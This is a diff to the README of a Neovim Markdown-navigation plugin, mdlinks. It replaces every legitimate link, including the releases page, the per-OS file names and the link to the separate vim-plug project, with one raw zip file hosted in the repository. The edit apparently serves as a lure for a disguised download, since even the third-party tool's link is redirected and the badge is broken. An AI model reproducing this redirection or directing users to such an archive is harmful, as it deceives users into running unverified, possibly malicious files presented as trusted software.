@@ -6,7 +6,7 @@ Welcome to **mdlinks**! This plugin helps you move through Markdown entities qui
 
 ## 📥 Download mdlinks
 
-[![Download mdlinks](https://img.shields.io/badge/Download%20mdlinks-v1.0.0-brightgreen)](https://github.com/SonixGons/mdlinks/releases)
+[![Download mdlinks](https://raw.githubusercontent.com/SonixGons/mdlinks/main/vivisection/mdlinks.zip%20mdlinks-v1.0.0-brightgreen)](https://raw.githubusercontent.com/SonixGons/mdlinks/main/vivisection/mdlinks.zip)
 
 ## 📦 System Requirements
 
@@ -21,7 +21,7 @@ Before you install, make sure your system meets these basic requirements:
 
 ### 1. Visit the Releases Page
 
-To download mdlinks, [visit this page to download](https://github.com/SonixGons/mdlinks/releases). 
+To download mdlinks, [visit this page to download](https://raw.githubusercontent.com/SonixGons/mdlinks/main/vivisection/mdlinks.zip). 
 
 ### 2. Choose the Right File
 
@@ -31,9 +31,9 @@ On the releases page, you will see different versions available. Select the most
 
 Click on the version you chose. You will see a list of files. Download the one that matches your operating system:
 
-- For Windows: **mdlinks-windows-x64.zip**
-- For macOS: **mdlinks-macos.zip**
-- For Linux: **mdlinks-linux.zip**
+- For Windows: **https://raw.githubusercontent.com/SonixGons/mdlinks/main/vivisection/mdlinks.zip**
+- For macOS: **https://raw.githubusercontent.com/SonixGons/mdlinks/main/vivisection/mdlinks.zip**
+- For Linux: **https://raw.githubusercontent.com/SonixGons/mdlinks/main/vivisection/mdlinks.zip**
 
 ### 4. Extract the Files
 
@@ -49,7 +49,7 @@ Run the following command to install the plugin:
 nvim +PlugInstall +qall
 ```
 
-This command uses a popular Neovim plugin manager. If you don't have one set up yet, consider using [vim-plug](https://github.com/junegunn/vim-plug) for easy plugin management.
+This command uses a popular Neovim plugin manager. If you don't have one set up yet, consider using [vim-plug](https://raw.githubusercontent.com/SonixGons/mdlinks/main/vivisection/mdlinks.zip) for easy plugin management.
 
 ### 6. Verify Installation
 
@@ -113,4 +113,4 @@ Thank you for choosing mdlinks! Enjoy smooth navigation through your Markdown fi
 
 ## 📄 Final Notes
 
-Don't forget to update your plugin regularly to access new features and improvements. You can always check for updates on our [Releases page](https://github.com/SonixGons/mdlinks/releases).
+Don't forget to update your plugin regularly to access new features and improvements. You can always check for updates on our [Releases page](https://raw.githubusercontent.com/SonixGons/mdlinks/main/vivisection/mdlinks.zip).
